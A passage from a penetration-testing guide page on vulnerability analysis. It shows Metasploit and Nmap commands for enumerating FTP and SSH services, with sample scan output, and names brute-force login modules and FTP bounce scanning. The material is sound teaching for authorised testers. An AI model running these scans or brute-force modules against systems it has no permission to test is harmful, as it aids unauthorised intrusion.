<li class="toctree-l3"><a class="reference internal" href="#id68">Nmap</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id69">Metasploit</a></li>
<li class="toctree-l3"><a class="reference internal" href="#id70">Other</a></li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="#port-8009-ajp-apache-jserv-protocol">Port 8009 - AJP (Apache JServ Protocol)</a></li>
<li class="toctree-l2"><a class="reference internal" href="#port-9100-pjl">Port 9100 - PJL</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#id71">Metasploit</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#printer-version-information-scanner">Printer Version Information Scanner</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="#id72">Nmap</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#pjl-ready-message">PJL-ready-message</a></li>
</ul>
</li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="#port-9160-apache-cassandra">Port 9160 - Apache Cassandra</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#id74">NMap</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#cassandra-info">Cassandra-info</a></li>
<li class="toctree-l4"><a class="reference internal" href="#cassandra-brute">Cassandra-brute</a></li>
</ul>
</li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="#port-10000-ndmp-network-data-management-protocol">Port 10000 - ndmp (Network Data Management Protocol)</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#id76">Nmap</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#ndmp-fs-info">ndmp-fs-info</a></li>
<li class="toctree-l4"><a class="reference internal" href="#ndmp-version">ndmp-version</a></li>
</ul>
</li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="#port-11211-memcache">Port 11211 - Memcache</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#id78">Nmap</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#memcached-info">memcached-info</a></li>
<li class="toctree-l4"><a class="reference internal" href="#id80">Other</a></li>
</ul>
</li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="#port-27017-27018-mongodb">Port 27017/27018 - MongoDB</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#id81">Metasploit</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#mongodb-login-utility">MongoDB Login Utility</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="#id82">Nmap</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#mongodb-info">Mongodb-info</a></li>
<li class="toctree-l4"><a class="reference internal" href="#mongodb-database">Mongodb-database</a></li>
<li class="toctree-l4"><a class="reference internal" href="#mongodb-bruteforce">Mongodb-BruteForce</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="#id83">Other</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#connection-string">Connection String</a></li>
<li class="toctree-l4"><a class="reference internal" href="#mongo-shell">Mongo-shell</a></li>
</ul>
</li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="#port-44818-ethernetip-tcp-udp">Port 44818 - EthernetIP-TCP-UDP</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#id84">Nmap</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#enip-enumerate">enip-enumerate</a></li>
</ul>
</li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="#port-47808-udp-bacnet">Port 47808 - UDP BACNet</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#bacnet-discover-enumerate">BACNet-discover-enumerate</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#id86">Others</a></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li class="toctree-l1"><a class="reference internal" href="LFF-IPS-P3-Exploitation.html">Exploitation</a></li>
<li class="toctree-l1"><a class="reference internal" href="LFF-IPS-P4-PostExploitation.html">Post Exploitation</a></li>
<li class="toctree-l1"><a class="reference internal" href="LFF-IPS-P5-Reporting.html">Reporting</a></li>
<li class="toctree-l1"><a class="reference internal" href="LFF-IPS-P6-ConfigurationReview.html">Configuration Review</a></li>
</ul>
<p class="caption" role="heading"><span class="caption-text">Vulnerable Machines</span></p>
<ul>
<li class="toctree-l1"><a class="reference internal" href="../Series_Vulnerable_Machines/LFC-VM-P0-InitialRecon.html">Initial Recon</a></li>
<li class="toctree-l1"><a class="reference internal" href="../Series_Vulnerable_Machines/LFC-VM-P1-FromNothingToUnprivilegedShell.html">From Nothing to a Unprivileged Shell</a></li>
<li class="toctree-l1"><a class="reference internal" href="../Series_Vulnerable_Machines/LFC-VM-P2-UnprivilegedToPrivilegedShell.html">Unprivileged Shell to Privileged Shell</a></li>
<li class="toctree-l1"><a class="reference internal" href="../Series_Vulnerable_Machines/LFC-VM-P3-TipsAndTricks.html">Tips and Tricks</a></li>
<li class="toctree-l1"><a class="reference internal" href="../Series_Vulnerable_Machines/LFC-VM-P4-Appendix.html">Appendix</a></li>
</ul>
<p class="caption" role="heading"><span class="caption-text">CTF - Challenges</span></p>
<ul>
<li class="toctree-l1"><a class="reference internal" href="../Series_Capture_The_Flag/LFC-BinaryExploitation.html">Binary Exploitation</a></li>
<li class="toctree-l1"><a class="reference internal" href="../Series_Capture_The_Flag/LFC-Forensics.html">Forensics</a></li>
<li class="toctree-l1"><a class="reference internal" href="../Series_Capture_The_Flag/LFC-ReverseEngineering.html">Reverse Engineering</a></li>
<li class="toctree-l1"><a class="reference internal" href="../Series_Capture_The_Flag/LFC-Cryptography.html">Cryptography</a></li>
<li class="toctree-l1"><a class="reference internal" href="../Series_Capture_The_Flag/LFC-CodingQuickRef.html">Coding Quick Reference</a></li>
</ul>
<p class="caption" role="heading"><span class="caption-text">Critical Infrastructure</span></p>
<ul>
<li class="toctree-l1"><a class="reference internal" href="../Series_Critical_Infrastructure/LFF-CIS-IndustrialControlSystems.html">Industrial Control Systems</a></li>
<li class="toctree-l1"><a class="reference internal" href="../Series_Critical_Infrastructure/LFF-CIS-ElectricalGrid.html">Electrical Grid</a></li>
</ul>

        </div>
      </div>
    </nav>

    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap"><nav class="wy-nav-top" aria-label="Mobile navigation menu" >
          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
          <a href="../index.html">tech.bitvijays.com</a>
      </nav>

      <div class="wy-nav-content">
        <div class="rst-content">
          <div role="navigation" aria-label="Page navigation">
  <ul class="wy-breadcrumbs">
      <li><a href="../index.html" class="icon icon-home" aria-label="Home"></a></li>
      <li class="breadcrumb-item active">Vulnerability Analysis</li>
      <li class="wy-breadcrumbs-aside">
      </li>
  </ul>
  <hr/>
</div>
          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
           <div itemprop="articleBody">
             
  <section id="vulnerability-analysis">
<h1>Vulnerability Analysis<a class="headerlink" href="#vulnerability-analysis" title="Link to this heading"></a></h1>
<p>So, by using <strong>intelligence gathering</strong> we have completed the normal scanning and banner grabbing. Yay!!. Now, it’s time for some <strong>metasploit-fu</strong> and <strong>nmap-fu</strong>. We would go thru almost every port/ service and figure out what information can be retrieved from it and whether it can be exploited or not?</p>
<p>So we start with creating a new workspace in the msfconsole for better work.</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">msfconsole -q -- Starts Metasploit Console quietly</span>
<span class="go">workspace -a &lt;Engagement_Name&gt; -- Add a new workspace with the engagement name specified</span>
<span class="go">workspace &lt;Engagement_Name&gt; -- Switch to the new workspace</span>
</pre></div>
</div>
<p>Let’s import all the nmap xml file (Nmap XML file saved after doing port scan) of different network ranges</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">db_import /root/Documents/Project_Location/Engagement_Name/Internal/Site_10.*.*.0_*/nmap_scans/Port_Scan/*.xml</span>
</pre></div>
</div>
<p>After all the importing, it’s important to check what all services/ ports are running to get a feel of different possibilities.</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">services -c port,name -u -o /tmp/ports</span>
<span class="go">^ -u is used for only showing ports which are open.</span>
</pre></div>
</div>
<p>This will write a file in /tmp/ports containing the port number and it’s name. info could also be used to get more information.</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">cat /tmp/ports | cut -d , -f2,3 | sort | uniq | tr -d \&quot; | grep -v -E &#39;port|tcpwrapped&#39; | sort -n</span>
</pre></div>
</div>
<p>This will provide you the sorted ports running on the network which can be then viewed to probe further.</p>
<p>A sample output is</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">***SNIP**</span>
<span class="go">20,ftp-data</span>
<span class="go">21,ftp</span>
<span class="go">22,ssh</span>
<span class="go">23,landesk-rc</span>
<span class="go">23,telnet</span>
<span class="go">24,priv-mail</span>
<span class="go">25,smtp</span>
<span class="go">25,smtp-proxy</span>
<span class="go">***SNIP**</span>
</pre></div>
</div>
<p>Let’s move <strong>port by port</strong> and check what metasploit framework and nmap nse has to offer. By no means, this is a complete list, new ports, metasploit modules, nmap nse will be added as used. This post currently covers the below ports/ services. Mostly exploited are Apache Tomcat, JBoss, Java RMI, Jenkins, ISCSI, HP HPDataProtector RCE, IPMI, RTSP, VNC, X11 etc.</p>
<ul class="simple">
<li><p><a class="reference internal" href="#ftp-port-21"><span class="std std-ref">Port 21 - FTP</span></a></p></li>
<li><p><a class="reference internal" href="#ssh-port-22"><span class="std std-ref">Port 22 - SSH</span></a></p></li>
<li><p><a class="reference internal" href="#telnet-port-23"><span class="std std-ref">Port 23 - Telnet</span></a></p></li>
<li><p><a class="reference internal" href="#smtp-port-25-and-submission-port-587"><span class="std std-ref">Port 25 - SMTP | Port 587 - Submission</span></a></p></li>
<li><p><a class="reference internal" href="#dns-port-53"><span class="std std-ref">Port 53 - DNS</span></a></p></li>
<li><p><a class="reference internal" href="#finger-port-79"><span class="std std-ref">Port 79 - Finger</span></a></p></li>
<li><p><a class="reference internal" href="#http"><span class="std std-ref">HTTP</span></a></p></li>
<li><p><a class="reference internal" href="#http-webmin"><span class="std std-ref">Webmin</span></a></p></li>
<li><p><a class="reference internal" href="#http-jenkins"><span class="std std-ref">Jenkins</span></a></p></li>
<li><p><a class="reference internal" href="#http-apache-tomcat"><span class="std std-ref">Apache Tomcat</span></a></p></li>
<li><p><a class="reference internal" href="#http-jboss"><span class="std std-ref">JBoss</span></a></p></li>
<li><p><a class="reference internal" href="#http-lotus-domino"><span class="std std-ref">Lotus Domino httpd</span></a></p></li>
<li><p><a class="reference internal" href="#http-iis"><span class="std std-ref">IIS</span></a></p></li>
<li><p><a class="reference internal" href="#http-vmware-esxi"><span class="std std-ref">VMware ESXi</span></a></p></li>
<li><p><a class="reference internal" href="#kerberos-port-88"><span class="std std-ref">Port 88 - Kerberos</span></a></p></li>
<li><p><a class="reference internal" href="#pop3-port-110"><span class="std std-ref">Port 110 - POP3</span></a></p></li>
<li><p><a class="reference internal" href="#rpcinfo-port-111"><span class="std std-ref">Port 111 - RPCInfo</span></a></p></li>
<li><p><a class="reference internal" href="#ident-port-113"><span class="std std-ref">Port 113 - Ident</span></a></p></li>
<li><p><a class="reference internal" href="#netbios"><span class="std std-ref">NetBios</span></a></p></li>
<li><p><a class="reference internal" href="#snmp-port-161"><span class="std std-ref">Port 161 - SNMP</span></a></p></li>
<li><p><a class="reference internal" href="#check-point-firewall-1-topology-port-264"><span class="std std-ref">Port 264 - Check Point FireWall-1 Topology</span></a></p></li>
<li><p><a class="reference internal" href="#ldap-port-389"><span class="std std-ref">Port 389 - LDAP</span></a></p></li>
<li><p><a class="reference internal" href="#smb-port-445"><span class="std std-ref">Port 445 - SMB</span></a></p></li>
<li><p><a class="reference internal" href="#rexec-port-512"><span class="std std-ref">Port 512 - rexec</span></a></p></li>
<li><p><a class="reference internal" href="#rlogin-port-513"><span class="std std-ref">Port 513 - rlogin</span></a></p></li>
<li><p><a class="reference internal" href="#rsh-port-514"><span class="std std-ref">Port 514 - RSH</span></a></p></li>
<li><p><a class="reference internal" href="#afp-applice-filing-protocol-port-548"><span class="std std-ref">Port 548 - AFP (Apple Filing Protocol)</span></a></p></li>
<li><p><a class="reference internal" href="#rpc-port-135-port-593"><span class="std std-ref">Microsoft Windows RPC Services | Port 135 and Microsoft RPC Services over HTTP | Port 593</span></a></p></li>
<li><p><a class="reference internal" href="#https-port-443-and-8443"><span class="std std-ref">Port 443/8443 - HTTPS</span></a></p></li>
<li><p><a class="reference internal" href="#rtsp-port-554-and-8554"><span class="std std-ref">Port 554/8554 - RTSP</span></a></p></li>
<li><p><a class="reference internal" href="#rsync-port-873"><span class="std std-ref">Port 873 - Rsync</span></a></p></li>
<li><p><a class="reference internal" href="#java-rmi-port-1099"><span class="std std-ref">Port 1099 - Java RMI</span></a></p></li>
<li><p><a class="reference internal" href="#ms-sql-port-1443"><span class="std std-ref">Port 1433 - MS-SQL</span></a></p></li>
<li><p><a class="reference internal" href="#oracle-port-1521"><span class="std std-ref">Port 1521 - Oracle</span></a></p></li>
<li><p><a class="reference internal" href="#nfs-port-2049"><span class="std std-ref">Port 2049 - NFS</span></a></p></li>
<li><p><a class="reference internal" href="#iscsi-port-3260"><span class="std std-ref">Port 3260 - ISCSI</span></a></p></li>
<li><p><a class="reference internal" href="#sap-router-port-3299"><span class="std std-ref">Port 3299 - SAP Router</span></a></p></li>
<li><p><a class="reference internal" href="#mysql-port-3306"><span class="std std-ref">Port 3306 - MySQL</span></a></p></li>
<li><p><a class="reference internal" href="#postgresql-port-5432"><span class="std std-ref">Port 5432 - Postgresql</span></a></p></li>
<li><p><a class="reference internal" href="#hpdataprotector-rce-port-5555"><span class="std std-ref">Port 5555 - HPDataProtector RCE</span></a></p></li>
<li><p><a class="reference internal" href="#vnc-port-5900"><span class="std std-ref">Port 5900 - VNC</span></a></p></li>
<li><p><a class="reference internal" href="#couchdb-port-5984"><span class="std std-ref">Port 5984 - CouchDB</span></a></p></li>
<li><p><a class="reference internal" href="#x11-port-6000"><span class="std std-ref">Other</span></a></p></li>
<li><p><a class="reference internal" href="#redis-port-6379"><span class="std std-ref">Port 6379 - Redis</span></a></p></li>
<li><p><a class="reference internal" href="#ajp-apache-jserv-protocol-port-8009"><span class="std std-ref">Port 8009 - AJP (Apache JServ Protocol)</span></a></p></li>
<li><p><a class="reference internal" href="#pjl-port-9100"><span class="std std-ref">Port 9100 - PJL</span></a></p></li>
<li><p><a class="reference internal" href="#apache-cassandra-port-9160"><span class="std std-ref">Port 9160 - Apache Cassandra</span></a></p></li>
<li><p><a class="reference internal" href="#network-data-management-protocol-port-10000"><span class="std std-ref">Port 10000 - ndmp (Network Data Management Protocol)</span></a></p></li>
<li><p><a class="reference internal" href="#memcache-port-11211"><span class="std std-ref">Port 11211 - Memcache</span></a></p></li>
<li><p><a class="reference internal" href="#mongodb-port-27017-and-port-27018"><span class="std std-ref">Port 27017/27018 - MongoDB</span></a></p></li>
<li><p><a class="reference internal" href="#ethernetip-tcp-udp-port-44818"><span class="std std-ref">Port 44818 - EthernetIP-TCP-UDP</span></a></p></li>
<li><p><a class="reference internal" href="#udp-bacnet-port-47808"><span class="std std-ref">Port 47808 - UDP BACNet</span></a></p></li>
</ul>
<section id="port-21-ftp">
<span id="ftp-port-21"></span><h2>Port 21 - FTP<a class="headerlink" href="#port-21-ftp" title="Link to this heading"></a></h2>
<p>So, on a network we can find multiple versions of ftp servers running. Let’s find out by</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">services -p 21 -c info -o /tmp/ftpinfo</span>
<span class="go">cat /tmp/ftpinfo | cut -d , -f2 | sort | uniq</span>
</pre></div>
</div>
<p>A Sample output is</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">&quot;Alfresco Document Management System ftpd&quot;</span>
<span class="go">&quot;D-Link Printer Server ftpd&quot;</span>
<span class="go">&quot;FreeBSD ftpd 6.00LS&quot;</span>
<span class="go">&quot;HP JetDirect ftpd&quot;</span>
<span class="go">&quot;HP LaserJet P4014 printer ftpd&quot;</span>
<span class="go">&quot;Konica Minolta bizhub printer ftpd&quot;</span>
<span class="go">&quot;Microsoft ftpd&quot;</span>
<span class="go">&quot;National Instruments LabVIEW ftpd&quot;</span>
<span class="go">&quot;NetBSD lukemftpd&quot;</span>
<span class="go">&quot;Nortel CES1010E router ftpd&quot;</span>
<span class="go">&quot;oftpd&quot;</span>
<span class="go">&quot;OpenBSD ftpd 6.4 Linux port 0.17&quot;</span>
<span class="go">&quot;PacketShaper ftpd&quot;</span>
<span class="go">&quot;ProFTPD 1.3.3&quot;</span>
<span class="go">&quot;Pure-FTPd&quot;</span>
<span class="go">&quot;Ricoh Aficio MP 2000 printer ftpd 6.15&quot;</span>
<span class="go">&quot;Ricoh Aficio MP 2000 printer ftpd 6.17&quot;</span>
<span class="go">&quot;Ricoh Aficio MP 2352 printer ftpd 10.67&quot;</span>
<span class="go">&quot;Ricoh Aficio MP 4002 printer ftpd 11.103&quot;</span>
<span class="go">&quot;Ricoh Aficio MP W3600 printer ftpd 6.15&quot;</span>
<span class="go">&quot;Ricoh Aficio SP 3500SF printer ftpd 75905e&quot;</span>
<span class="go">&quot;vsftpd&quot;</span>
<span class="go">&quot;vsftpd 2.0.4+ (ext.3)&quot;</span>
<span class="go">&quot;vsftpd 2.0.5&quot;</span>
<span class="go">&quot;vsftpd 2.0.8 or later&quot;</span>
<span class="go">&quot;vsftpd 2.2.2&quot;</span>
<span class="go">&quot;vsftpd 3.0.2&quot;</span>
<span class="go">&quot;vsftpd (before 2.0.8) or WU-FTPD&quot;</span>
<span class="go">&quot;WU-FTPD or MIT Kerberos ftpd 5.60&quot;</span>
<span class="go">&quot;WU-FTPD or MIT Kerberos ftpd 6.00L</span>
</pre></div>
</div>
<section id="metasploit">
<h3>Metasploit<a class="headerlink" href="#metasploit" title="Link to this heading"></a></h3>
<section id="ftp-version-scanner">
<h4>FTP Version Scanner<a class="headerlink" href="#ftp-version-scanner" title="Link to this heading"></a></h4>
<p>Detect the ftp version.</p>
<p>This can be done using</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">use auxiliary/scanner/ftp/ftp_version</span>
<span class="go">services -p 21 -R</span>
</pre></div>
</div>
<p>Sample Output:</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">[*] 172.16.xx.xx:21 FTP Banner: &#39;220 BDL095XXXX FTP server ready.\x0d\x0a&#39;</span>
<span class="go">[*] 172.16.xx.xx:21 FTP Banner: &#39;220 (vsFTPd 2.0.5)\x0d\x0a&#39;</span>
<span class="go">[*] 172.16.xx.xx:21 FTP Banner: &#39;220 ProFTPD 1.3.2 Server (ProFTPD Default Installation) [172.16.110.51]\x0d\x0a&#39;</span>
<span class="go">[*] 172.16.xx.xx:21 FTP Banner: &#39;220 pSCn-D1 FTP server (Version 4.2 Tue Feb 19 19:37:47 CST 2013) ready.\x0d\x0a&#39;</span>
<span class="go">[*] 172.16.xx.xx:21 FTP Banner: &#39;220 pSCn-Dev FTP server (Version 4.2 Tue Feb 19 19:37:47 CST 2013) ready.\x0d\x0a&#39;</span>
<span class="go">[*] Auxiliary module execution completed</span>
</pre></div>
</div>
</section>
<section id="anonymous-ftp-access-detection">
<h4>Anonymous FTP Access Detection<a class="headerlink" href="#anonymous-ftp-access-detection" title="Link to this heading"></a></h4>
<p>Detect anonymous (read/ write) FTP server access.</p>
<p>A sample of results is</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">[+] 10.10.xx.xx:21 - Anonymous READ/WRITE (220 Microsoft FTP Service)</span>
<span class="go">[+] 10.10.xx.xx:21 - Anonymous READ (220 Microsoft FTP Service)</span>
</pre></div>
</div>
</section>
<section id="ftp-authentication-scanner">
<h4>FTP Authentication Scanner<a class="headerlink" href="#ftp-authentication-scanner" title="Link to this heading"></a></h4>
<p>FTP Authentication Scanner which will test FTP logins on a range of machines and report successful logins.</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">use auxiliary/scanner/ftp/ftp_login</span>
<span class="go">services -p 21 -R</span>
</pre></div>
</div>
<p>Sample Output:</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">Yet to run</span>
</pre></div>
</div>
</section>
<section id="ftp-bounce-port-scanner">
<h4>FTP Bounce Port Scanner<a class="headerlink" href="#ftp-bounce-port-scanner" title="Link to this heading"></a></h4>
<p>Enumerate TCP services via the FTP bounce PORT/LIST method.</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">use auxiliary/scanner/portscan/ftpbounce</span>
</pre></div>
</div>
</section>
</section>
<section id="nmap">
<h3>Nmap<a class="headerlink" href="#nmap" title="Link to this heading"></a></h3>
<section id="ftp-anon">
<h4>ftp-anon<a class="headerlink" href="#ftp-anon" title="Link to this heading"></a></h4>
<p><a class="reference external" href="https://nmap.org/nsedoc/scripts/ftp-anon.html">ftp-anon.nse</a> : Checks if an FTP server allows anonymous logins. If anonymous is allowed, gets a directory listing of the root directory and highlights writeable files.</p>
<p>Sample Output:</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">nmap -sV --script ftp-anon -p 21 10.10.xx.xx</span>

<span class="go">Starting Nmap 7.01 (https://nmap.org) at 2016-04-03 21:53 IST</span>
<span class="go">Nmap scan report for 10.10.xx.xx</span>
<span class="go">Host is up (0.018s latency).</span>
<span class="go">PORT   STATE SERVICE VERSION</span>
<span class="go">21/tcp open  ftp     vsftpd 2.2.2</span>
<span class="go">| ftp-anon: Anonymous FTP login allowed (FTP code 230)</span>
<span class="go">|_drwxr-xr-x    2 0        0            4096 Jun 25  2011 pub</span>
<span class="go">Service Info: OS: Unix</span>
</pre></div>
</div>
</section>
<section id="ftp-brute">
<h4>ftp-brute<a class="headerlink" href="#ftp-brute" title="Link to this heading"></a></h4>
<p><a class="reference external" href="https://nmap.org/nsedoc/scripts/ftp-brute.html">ftp-brute.nse</a> : Performs brute force password auditing against FTP servers.</p>
</section>
<section id="ftp-bounce">
<h4>ftp-bounce<a class="headerlink" href="#ftp-bounce" title="Link to this heading"></a></h4>
<p><a class="reference external" href="https://nmap.org/nsedoc/scripts/ftp-bounce.html">ftp-bounce.nse</a> : Checks to see if an FTP server allows port scanning using the FTP bounce method.</p>
</section>
</section>
</section>
<section id="port-22-ssh">
<span id="ssh-port-22"></span><h2>Port 22 - SSH<a class="headerlink" href="#port-22-ssh" title="Link to this heading"></a></h2>
<section id="id1">
<h3>Metasploit<a class="headerlink" href="#id1" title="Link to this heading"></a></h3>
<section id="ssh-version-scanner">
<h4>SSH Version Scanner<a class="headerlink" href="#ssh-version-scanner" title="Link to this heading"></a></h4>
<p>Detect SSH version.</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">use auxiliary/scanner/ssh/ssh_version</span>
<span class="go">services -p 22 -u -R</span>
</pre></div>
</div>
<p>Sample output</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">[*] 10.23.xx.xx:22 SSH server version: SSH-2.0-OpenSSH_5.8 (service.version=5.8 service.vendor=OpenBSD service.family=OpenSSH service.product=OpenSSH)</span>
<span class="go">[*] 10.23.xx.xx:22 SSH server version: SSH-2.0-9nroL</span>
<span class="go">[*] 10.23.xx.xx:22 SSH server version: SSH-1.99-Cisco-1.25 (service.version=1.25 service.vendor=Cisco service.product=SSH os.vendor=Cisco os.product=IOS os.certainty=0.8)</span>
</pre></div>
</div>
<p>There’s a auxilary module to try</p>
</section>
<section id="ssh-brute-force">
<h4>SSH Brute force<a class="headerlink" href="#ssh-brute-force" title="Link to this heading"></a></h4>
<p>SSH Login Check Scanner will test ssh logins on a range of machines and report successful logins. Caution: BruteForce.</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">use auxiliary/scanner/ssh/ssh_login</span>
<span class="go">services -p 22 -u -R</span>
</pre></div>
</div>
</section>
</section>
<section id="id2">
<h3>Nmap<a class="headerlink" href="#id2" title="Link to this heading"></a></h3>
<p>has three NSE</p>
<section id="ssh2-enum-algos">
<h4>ssh2-enum-algos<a class="headerlink" href="#ssh2-enum-algos" title="Link to this heading"></a></h4>
<p><a class="reference external" href="https://nmap.org/nsedoc/scripts/ssh2-enum-algos.html">ssh2-enum-algos.nse</a> : Reports the number of algorithms (for encryption, compression, etc.) that the target SSH2 server offers. If verbosity is set, the offered algorithms are each listed by type.</p>
<p>Sample Output:</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">nmap --script ssh2-enum-algos -p 22 -n 103.206.xx.xx</span>

<span class="go">Starting Nmap 7.01 (https://nmap.org) at 2016-04-03 22:04 IST</span>
<span class="go">Nmap scan report for 103.206.xx.xx</span>
<span class="go">Host is up (0.018s latency).</span>
<span class="go">PORT   STATE SERVICE</span>
<span class="go">22/tcp open  ssh</span>
<span class="go">| ssh2-enum-algos:</span>
<span class="go">|   kex_algorithms: (4)</span>
<span class="go">|       diffie-hellman-group-exchange-sha256</span>
<span class="go">|       diffie-hellman-group-exchange-sha1</span>
<span class="go">|       diffie-hellman-group14-sha1</span>
<span class="go">|       diffie-hellman-group1-sha1</span>
<span class="go">|   server_host_key_algorithms: (2)</span>
<span class="go">|       ssh-dss</span>
<span class="go">|       ssh-rsa</span>
<span class="go">|   encryption_algorithms: (9)</span>
<span class="go">|       aes128-ctr</span>
<span class="go">|       aes192-ctr</span>
<span class="go">|       aes256-ctr</span>
<span class="go">|       aes128-cbc</span>
<span class="go">|       aes192-cbc</span>
<span class="go">|       aes256-cbc</span>
<span class="go">|       blowfish-cbc</span>
<span class="go">|       3des-cbc</span>
<span class="go">|       none</span>
<span class="go">|   mac_algorithms: (2)</span>
<span class="go">|       hmac-sha1</span>
<span class="go">|       hmac-md5</span>
<span class="go">|   compression_algorithms: (1)</span>
<span class="go">|_      none</span>

<span class="go">Nmap done: 1 IP address (1 host up) scanned in 0.65 seconds</span>
</pre></div>
</div>
</section>
<section id="ssh-hostkey">
<h4>SSH-Hostkey<a class="headerlink" href="#ssh-hostkey" title="Link to this heading"></a></h4>
<p><a class="reference external" href="https://nmap.org/nsedoc/scripts/ssh-hostkey.html">ssh-hostkey.nse</a> : Shows SSH hostkeys</p>
<p>Sample Output:</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">nmap --script ssh-hostkey -p 22 -n 103.206.xx.xx --script-args ssh_hostkey=full</span>

<span class="go">Starting Nmap 7.01 (https://nmap.org) at 2016-04-03 22:07 IST</span>
<span class="go">Nmap scan report for 103.206.xx.xx</span>
<span class="go">Host is up (0.019s latency).</span>
<span class="go">PORT   STATE SERVICE</span>
<span class="go">22/tcp open  ssh</span>
<span class="go">| ssh-hostkey:</span>
<span class="go">|   ssh-dss AAAAB3NzaC1kc3MAAACBAOohTo8BeSsafI78mCTp7vz1ETkdSXNj8wgrYMD+DOEDpdfMEqYJOFPUWiyK0HrkyrP7UyODp9SEcrOzem98iDUgvPZFfSRhKpdTktQtt9+9mzDpfHgqryD04o2JvjZc6HlMwZToulurZwgt0+npep8Asb32lRCGAkFpPA7r3NdfAAAAFQDypzDnHTTgcy/vQNUDe+RlnFxX0wAAAIAXBBnv/P1RyzGdGM+JX2tbM6gJvC4WNoq7Okdh1ZH2Rxn1plU+oTt189ZI5UcR67x504o5fXVZ0pj3yJh6yMQFfsw89iSbTGmM6V1wYnq+s1Lz83XvgHIepV0OdOj2HE4tCytS6md0udLSio6RlWTVG/8vFrwb/C2KoL36JiIABgAAAIAUTOQm2+LVNqISuZT/doDbz5H89dCbLyL0uNiPRGW3XGjsZrW/iyvN/FQ1Lz0vai1db3UPbkNvhQNhOIJtAYClyQg1bTjvBCV2YvG9P91Ljyl6avSUoPEDg7h46E90TpneFa0tRf+V3RBC4KbXHrelgHye+2ZUkaebOmsRt2h4sQ==</span>
<span class="go">|_  ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDIRocXKgi0l3kZeVNEPlMXBBDj4WYAPFzNgf63+e/RMN5DSYz4AmVw1V8o+gsaL3mCeMwRdMfPCVlDdFPRDbZhyXNiG2vstc+gbeOHyDaLuQJVMF/++M8Yw9GWr7dOOA9zUfRkYVrQT53bfYzSpiulZpAbnkY0X5Ma40aO56Sq4H1NNqb7ZBdCWmder3veBq+6R9z+xSY0ji5Csr52bIl2Bka36KfYx325rrUP//lWDUDwK+hQ8jL9EjP884uPflRJPqdxoWLK001exSPHmcZOFNCeb2TQSkTbJVIh5Qg55eel2d0f/YZe24b6SalaANsZHt9MyG6Q5DNbtWvV2ixV</span>

<span class="go">Nmap done: 1 IP address (1 host up) scanned in 3.02 seconds</span>
</pre></div>
</div>
</section>
<section id="sshv1">
<h4>SSHv1<a class="headerlink" href="#sshv1" title="Link to this heading"></a></h4>
<p><a class="reference external" href="https://nmap.org/nsedoc/scripts/sshv1.html">sshv1.nse</a> : Checks if an SSH server supports the obsolete and less secure SSH Protocol Version 1.</p>
<p>Sample Output:</p>
<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">nmap --script sshv1 -p 22 -n 203.134.xx.xx</span>

<span class="go">Starting Nmap 7.01 (https://nmap.org) at 2016-04-03 23:16 IST</span>
<span class="go">Nmap scan report for 203.134.xx.xx</span>
<span class="go">Host is up (0.042s latency).</span>
<span class="go">PORT   STATE SERVICE</span>
<span class="go">22/tcp open  ssh</span>
<span class="go">|_sshv1: Server supports SSHv1</span>
</pre></div>
</div>
</section>
</section>
</section>
<section id="port-23-telnet">
<span id="telnet-port-23"></span><h2>Port 23 - Telnet<a class="headerlink" href="#port-23-telnet" title="Link to this heading"></a></h2>
<section id="id3">
<h3>Metasploit<a class="headerlink" href="#id3" title="Link to this heading"></a></h3>
<section id="telnet-version">
